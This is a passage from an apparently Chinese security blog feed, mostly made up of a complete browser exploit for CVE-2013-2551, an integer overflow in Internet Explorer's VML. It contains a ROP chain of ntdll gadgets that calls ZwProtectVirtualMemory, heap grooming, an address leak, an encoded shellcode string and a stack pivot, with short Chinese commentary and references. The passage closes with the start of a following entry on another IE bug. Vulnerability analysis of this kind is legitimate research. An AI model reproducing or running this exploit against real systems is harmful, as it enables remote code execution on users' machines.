class="keyword">var</span> arr = [</span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x0001cecb</span>),    <span class="comment">//# RETN</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x0001da87</span>),    <span class="comment">//# POP EBX # RETN</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x00046B13</span>),    <span class="comment">//# XCHG EAX,ESP # POP ESI # POP EDI # LEA EAX,DWORD PTR DS:[EDX-1] # POP EBX # RETN</span></span><br><span class="line"></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x0006D4F3</span>),    <span class="comment">//# POP EAX # OR DH,DH # RETN</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(data_off),    <span class="comment">//buf1 -&gt; eax</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000468e0</span>),    <span class="comment">//# POP EDX # RETN</span></span><br><span class="line">        <span class="built_in">Number</span>(shelladdr),                  <span class="comment">//BaseAddress-&gt; edx</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000CA46F</span>),    <span class="comment">//# MOV DWORD PTR DS:[EAX],EDX # POP EBP # RETN</span></span><br><span class="line">        <span class="number">0x90909090</span>,</span><br><span class="line"></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x0006D4F3</span>),    <span class="comment">//# POP EAX # OR DH,DH # RETN</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(data_off+<span class="number">0x4</span>),   <span class="comment">//buf2 -&gt; eax</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000468e0</span>),    <span class="comment">//# POP EDX # RETN</span></span><br><span class="line">        <span class="number">0x00010400</span>,                         <span class="comment">//NumberOfBytesToProtect -&gt; edx</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000CA46F</span>),    <span class="comment">//# MOV DWORD PTR DS:[EAX],EDX # POP EBP # RETN</span></span><br><span class="line">        <span class="number">0x90909090</span>,</span><br><span class="line"></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x0006D4F3</span>),    <span class="comment">//# POP EAX # OR DH,DH # RETN</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(data_off<span class="number">-0x4</span>),   <span class="comment">//buf3 -&gt; eax</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000468e0</span>),    <span class="comment">//# POP EDX # RETN</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000C3C64</span>),    <span class="comment">//# PUSHAD # RETN </span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000CA46F</span>),    <span class="comment">//# MOV DWORD PTR DS:[EAX],EDX # POP EBP # RETN</span></span><br><span class="line">        <span class="number">0x90909090</span>,</span><br><span class="line"></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x00034b9a</span>),     <span class="comment">//# POP EDI # RETN</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x00045360</span>),    <span class="comment">//ZwProtectVirtualMemory -&gt; edi</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x0001da87</span>),    <span class="comment">//# POP EBX # RETN</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(data_off+<span class="number">0x4</span>),   <span class="comment">//ptr to NumberOfBytesToProtect -&gt; ebx</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x0006D4F3</span>),    <span class="comment">//# POP EAX # OR DH,DH # RETN</span></span><br><span class="line">        <span class="number">0x8b37c4da</span>,</span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000576DA</span>),    <span class="comment">//# ADD EAX,74C83B66 # RETN</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x00008cbb</span>),    <span class="comment">//# XCHG EAX,EDX # ADD AL,0 # POP ESI # POP EBP # RETN 0x04 (0x00000040 -&gt; edx)</span></span><br><span class="line">        <span class="built_in">Number</span>(shelladdr),                  <span class="comment">//return address -&gt; esi</span></span><br><span class="line">        <span class="number">0xffffffff</span>,                         <span class="comment">//0xffffffff -&gt; ebp</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000614e8</span>),    <span class="comment">//# POP ECX # RETN</span></span><br><span class="line">        <span class="number">0x90909090</span>, </span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(data_off+<span class="number">0x8</span>),   <span class="comment">//ptr to OldAccessProtection -&gt; ecx</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x00037B20</span>),     <span class="comment">//# POP ESP # RETN</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(data_off<span class="number">-0x4</span>),   <span class="comment">//ptr to BaseAddress -&gt; esp               </span></span><br><span class="line">        <span class="number">0x90909090</span>,</span><br><span class="line">        <span class="number">0x90909090</span></span><br><span class="line">        ];</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h4><ul><li>前三句是<code>栈转移</code>代码</li><li>通过<code>MOV DWORD PTR DS:[EAX],EDX</code>，分别将<code>BaseAddress</code>、<code>NumberOfBytesToProtect</code>写入到<code>buf1</code>和<code>buf2</code></li><li><code>buf3</code>中存储的是指令<code>PUSHAD; RETN</code>的地址，因为在<code>rop</code>最后我们会将<code>buf3</code>的地址写入<code>esp</code>，导致栈转移到<code>buf</code>中。</li><li>因为不能出现<code>0x0000</code>这种数据，所以在将<code>0x00000040</code>写入<code>edx</code>时需要做一些处理。这里先将<code>0x8b37c4da</code>写入<code>eax</code>，然后将<code>eax</code>加上<code>0x74C83B66</code>，数据溢出后恰好是<code>0x40</code>，这就避免了<code>0x0000</code>的出现。</li></ul><h1 id="完整利用"><a href="#完整利用" class="headerlink" title="完整利用"></a>完整利用</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"x-ua-compatible"</span> <span class="attr">content</span>=<span class="string">"IE=EmulateIE9"</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>hpasserby<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">v\: * &#123; behavior:url(#default#VML); display:inline-block &#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xml:namespace</span> <span class="attr">ns</span>=<span class="string">"urn:schemas-microsoft-com:vml"</span> <span class="attr">prefix</span>=<span class="string">"v"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">v:oval</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">v:stroke</span> <span class="attr">id</span>=<span class="string">"vml1"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">v:oval</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> rect_array = <span class="keyword">new</span> <span class="built_in">Array</span>();</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Array</span>();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> rop_addr;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> ntdllbase;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">createRects</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">0x400</span>; i++)&#123;</span></span><br><span class="line"><span class="javascript">rect_array[i] = <span class="built_in">document</span>.createElement(<span class="string">"v:shape"</span>);</span></span><br><span class="line"><span class="javascript">rect_array[i].id = <span class="string">"rect"</span> + i.toString();</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.body.appendChild(rect_array[i]);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"> </span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> vml1  = <span class="built_in">document</span>.getElementById(<span class="string">"vml1"</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++)&#123;</span></span><br><span class="line"><span class="javascript">a[i] = <span class="built_in">document</span>.getElementById(<span class="string">"rect"</span> + i.toString())._vgRuntimeStyle;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++)&#123;</span></span><br><span class="line"><span class="undefined">a[i].rotation;</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (i == <span class="number">0x300</span>) &#123;</span></span><br><span class="line"><span class="javascript">vml1.dashstyle = <span class="string">"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44"</span></span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> length_orig = vml1.dashstyle.array.length;</span></span><br><span class="line"><span class="undefined">vml1.dashstyle.array.length = 0 - 1;   </span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++)&#123;  </span></span><br><span class="line"><span class="undefined">marginLeftAddress_orgin = vml1.dashstyle.array.item(0x2E+0x16);   </span></span><br><span class="line"><span class="javascript">a[i].marginLeft = <span class="built_in">unescape</span>(<span class="string">"%uc933%u8b64%u3041%u408b%u8b0c%u1470%u96ad%u8bad%u1058%u538b%u033c%u8bd3%u7852%ud303%u728b%u0320%u33f3%u41c9%u03ad%u81c3%u4738%u7465%u7550%u81f4%u0478%u6f72%u4163%ueb75%u7881%u6408%u7264%u7565%u8be2%u2472%uf303%u8b66%u4e0c%u8b49%u1c72%uf303%u148b%u038e%u33d3%u53c9%u5152%u6168%u7972%u6841%u694c%u7262%u4c68%u616f%u5464%uff53%u83d2%u0cc4%u5059%u6651%u6cb9%u516c%u7268%u2e74%u6864%u736d%u6376%uff54%u83d0%u10c4%u548b%u0424%uc933%ub951%u6d65%u6162%u8351%u246c%u6103%u6c83%u0224%u6862%u7973%u7473%u5054%ud2ff%uc483%u5510%uec8b%uec83%u3304%ubef6%u6d63%u0064%u7589%u8dfc%ufc75%uff56%u83d0%u08c4%u5a5e%ub95b%u7365%u6173%u8351%u246c%u6103%u5068%u6f72%u6863%u7845%u7469%u5354%ud2ff%uc933%uff51%u5fd0%u5b5e%uc481%u00c0%u0000%uec3b%u81e8%uff6a%u8bff%u5de5%u00c3"</span>);</span></span><br><span class="line"><span class="undefined">marginLeftAddress_modify = vml1.dashstyle.array.item(0x2E+0x16);</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (marginLeftAddress_orgin != marginLeftAddress_modify) &#123;</span></span><br><span class="line"><span class="undefined">vml1.dashstyle.array.item(0x2E+0x16) = 0x7ffe0300;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> leak = a[i].marginLeft;</span></span><br><span class="line"><span class="undefined">vml1.dashstyle.array.item(0x2E+0x16) = marginLeftAddress_orgin;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> shelladdr = marginLeftAddress_modify;</span></span><br><span class="line"><span class="javascript">ntdllbase = <span class="built_in">parseInt</span>(leak.charCodeAt(<span class="number">1</span>).toString(<span class="number">16</span>) + leak.charCodeAt(<span class="number">0</span>).toString(<span class="number">16</span>), <span class="number">16</span>) - <span class="number">0x464F0</span>;</span></span><br><span class="line"><span class="javascript">alert(<span class="string">"ntdllbase: 0x"</span> + ntdllbase.toString(<span class="number">16</span>));</span></span><br><span class="line"><span class="javascript">alert(<span class="string">"shelladdr: 0x"</span> + shelladdr.toString(<span class="number">16</span>));</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> rop_chain = tab2uni(get_ropchain(shelladdr));</span></span><br><span class="line"><span class="undefined">a[i].marginLeft = rop_chain;</span></span><br><span class="line"><span class="undefined">rop_addr = vml1.dashstyle.array.item(0x2E+0x16);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">vml1.dashstyle.array.item(0x2E+0x16) = marginLeftAddress_orgin;</span></span><br><span class="line"><span class="undefined">vml1.dashstyle.array.length = length_orig;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">alert(<span class="string">"ropaddr: 0x"</span> + rop_addr.toString(<span class="number">16</span>));</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">break</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">get_ropchain</span>(<span class="params">shelladdr</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> data_off = <span class="number">0x000D7000</span> + <span class="number">0x2000</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> arr = [</span></span><br><span class="line"><span class="javascript">ntdllbase + <span class="built_in">Number</span>(<span class="number">0x0001cecb</span>),    <span class="comment">//# RETN</span></span></span><br><span class="line"><span class="javascript">ntdllbase + <span class="built_in">Number</span>(<span class="number">0x0001da87</span>),    <span class="comment">//# POP EBX # RETN</span></span></span><br><span class="line"><span class="javascript">ntdllbase + <span class="built_in">Number</span>(<span class="number">0x00046B13</span>),    <span class="comment">//# XCHG EAX,ESP # POP ESI # POP EDI # LEA EAX,DWORD PTR DS:[EDX-1] # POP EBX # RETN</span></span></span><br><span class="line"><span class="javascript">ntdllbase + <span class="built_in">Number</span>(<span class="number">0x0006D4F3</span>),    <span class="comment">//# POP EAX # OR DH,DH # RETN</span></span></span><br><span class="line"><span class="javascript">ntdllbase + <span class="built_in">Number</span>(data_off),    <span class="comment">//buf1 -&gt; eax</span></span></span><br><span class="line"><span class="javascript">ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000468e0</span>),    <span class="comment">//# POP EDX # RETN</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">Number</span>(shelladdr),                  <span class="comment">//BaseAddress-&gt; edx</span></span></span><br><span class="line"><span class="javascript">ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000CA46F</span>),    <span class="comment">//# MOV DWORD PTR DS:[EAX],EDX # POP EBP # RETN</span></span></span><br><span class="line"><span class="undefined">0x90909090,</span></span><br><span class="line"><span class="javascript">ntdllbase + <span class="built_in">Number</span>(<span class="number">0x0006D4F3</span>),    <span class="comment">//# POP EAX # OR DH,DH # RETN</span></span></span><br><span class="line"><span class="javascript">ntdllbase + <span class="built_in">Number</span>(data_off+<span class="number">0x4</span>),   <span class="comment">//buf2 -&gt; eax</span></span></span><br><span class="line"><span class="javascript">ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000468e0</span>),    <span class="comment">//# POP EDX # RETN</span></span></span><br><span class="line"><span class="javascript"><span class="number">0x00010400</span>,                         <span class="comment">//NumberOfBytesToProtect -&gt; edx</span></span></span><br><span class="line"><span class="javascript">ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000CA46F</span>),    <span class="comment">//# MOV DWORD PTR DS:[EAX],EDX # POP EBP # RETN</span></span></span><br><span class="line"><span class="undefined">0x90909090,</span></span><br><span class="line"><span class="javascript">ntdllbase + <span class="built_in">Number</span>(<span class="number">0x0006D4F3</span>),    <span class="comment">//# POP EAX # OR DH,DH # RETN</span></span></span><br><span class="line"><span class="javascript">ntdllbase + <span class="built_in">Number</span>(data_off<span class="number">-0x4</span>),   <span class="comment">//buf3 -&gt; eax</span></span></span><br><span class="line"><span class="javascript">ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000468e0</span>),    <span class="comment">//# POP EDX # RETN</span></span></span><br><span class="line"><span class="javascript">ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000C3C64</span>),    <span class="comment">//# PUSHAD # RETN </span></span></span><br><span class="line"><span class="javascript">ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000CA46F</span>),    <span class="comment">//# MOV DWORD PTR DS:[EAX],EDX # POP EBP # RETN</span></span></span><br><span class="line"><span class="undefined">0x90909090,</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">ntdllbase + <span class="built_in">Number</span>(<span class="number">0x00034b9a</span>),     <span class="comment">//# POP EDI # RETN</span></span></span><br><span class="line"><span class="javascript">ntdllbase + <span class="built_in">Number</span>(<span class="number">0x00045360</span>),    <span class="comment">//ZwProtectVirtualMemory -&gt; edi</span></span></span><br><span class="line"><span class="javascript">ntdllbase + <span class="built_in">Number</span>(<span class="number">0x0001da87</span>),    <span class="comment">//# POP EBX # RETN</span></span></span><br><span class="line"><span class="javascript">ntdllbase + <span class="built_in">Number</span>(data_off+<span class="number">0x4</span>),   <span class="comment">//ptr to NumberOfBytesToProtect -&gt; ebx</span></span></span><br><span class="line"><span class="javascript">ntdllbase + <span class="built_in">Number</span>(<span class="number">0x0006D4F3</span>),    <span class="comment">//# POP EAX # OR DH,DH # RETN</span></span></span><br><span class="line"><span class="undefined">0x8b37c4da,</span></span><br><span class="line"><span class="javascript">ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000576DA</span>),    <span class="comment">//# ADD EAX,74C83B66 # RETN</span></span></span><br><span class="line"><span class="javascript">ntdllbase + <span class="built_in">Number</span>(<span class="number">0x00008cbb</span>),    <span class="comment">//# XCHG EAX,EDX # ADD AL,0 # POP ESI # POP EBP # RETN 0x04 (0x00000040 -&gt; edx)</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">Number</span>(shelladdr),                  <span class="comment">//return address -&gt; esi</span></span></span><br><span class="line"><span class="javascript"><span class="number">0xffffffff</span>,                         <span class="comment">//0xffffffff -&gt; ebp</span></span></span><br><span class="line"><span class="javascript">ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000614e8</span>),    <span class="comment">//# POP ECX # RETN</span></span></span><br><span class="line"><span class="undefined">0x90909090, </span></span><br><span class="line"><span class="javascript">ntdllbase + <span class="built_in">Number</span>(data_off+<span class="number">0x8</span>),   <span class="comment">//ptr to OldAccessProtection -&gt; ecx</span></span></span><br><span class="line"><span class="javascript">ntdllbase + <span class="built_in">Number</span>(<span class="number">0x00037B20</span>),     <span class="comment">//# POP ESP # RETN</span></span></span><br><span class="line"><span class="javascript">ntdllbase + <span class="built_in">Number</span>(data_off<span class="number">-0x4</span>),   <span class="comment">//ptr to BaseAddress -&gt; esp               </span></span></span><br><span class="line"><span class="undefined">0x90909090,</span></span><br><span class="line"><span class="undefined">0x90909090</span></span><br><span class="line"><span class="undefined">];</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> arr;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">d2u</span>(<span class="params">dword</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> uni = <span class="built_in">String</span>.fromCharCode(dword &amp; <span class="number">0xFFFF</span>);</span></span><br><span class="line"><span class="javascript">            uni += <span class="built_in">String</span>.fromCharCode(dword&gt;&gt;<span class="number">16</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> uni;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">tab2uni</span>(<span class="params">tab</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> uni = <span class="string">""</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;tab.length;i++) &#123;</span></span><br><span class="line"><span class="undefined">                uni += d2u(tab[i]);</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> uni;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> vml1  = <span class="built_in">document</span>.getElementById(<span class="string">"vml1"</span>)</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++)&#123;</span></span><br><span class="line"><span class="javascript">a[i] = <span class="built_in">document</span>.getElementById(<span class="string">"rect"</span> + i.toString())._anchorRect;</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (i == <span class="number">0x300</span>)&#123;</span></span><br><span class="line"><span class="javascript">vml1.dashstyle = <span class="string">"1 2 3 4"</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> length_orig = vml1.dashstyle.array.length;</span></span><br><span class="line"><span class="undefined">vml1.dashstyle.array.length = 0 - 1; </span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">vml1.dashstyle.array.item(6) = rop_addr;</span></span><br><span class="line"><span class="javascript">vml1.dashstyle.array.item(<span class="number">8</span>) = rop_addr;    <span class="comment">//rop_addr -&gt; ebx</span></span></span><br><span class="line"><span class="javascript">vml1.dashstyle.array.item(<span class="number">9</span>) = ntdllbase + <span class="number">0x000cb0f8</span>;<span class="comment">//# MOV ESP,EBX # POP EBX # RETN</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">0x400</span>; i++)</span></span><br><span class="line"><span class="undefined">&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">delete</span> a[i];</span></span><br><span class="line"><span class="undefined">CollectGarbage();</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="javascript">alert(<span class="string">"done"</span>);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">createRects();</span></span><br><span class="line"><span class="undefined">leak();</span></span><br><span class="line"><span class="undefined">exploit();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里有个玄学问题是，去掉alert之后利用成功率变得极低。。。有点懵逼</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="http://www.cnblogs.com/Danny-Wei/p/3766432.html" target="_blank" rel="noopener">CVE-2013-2551漏洞成因与利用分析</a></li><li><a href="https://dangokyo.me/2017/11/18/analysis-on-cve-2013-2551/" target="_blank" rel="noopener">Analysis on CVE-2013-2551</a></li><li><a href="http://c00c.cc/1496240787.html" target="_blank" rel="noopener">CVE-2013-2551分析</a></li><li><a href="http://www.4hou.com/technology/4241.html" target="_blank" rel="noopener">CVE-2013-2551样本分析及漏洞利用和防御</a></li><li><a href="https://bbs.pediy.com/thread-173600.htm" target="_blank" rel="noopener">IE 漏洞 CVE-2013-2551 分析</a></li><li><a href="http://www.vxjump.net/files/vuln_analysis/a_cve-2013-2551.txt" target="_blank" rel="noopener">漏洞CVE-2013-2551逆向分析</a></li></ul><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> browser </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 堆利用 </tag>
            
            <tag> IE </tag>
            
            <tag> 整数溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IE越界访问漏洞[cve-2012-1876]分析</title>
      <link href="/post/b72ee585.html"/>
      <url>/post/b72ee585.html</url>
      
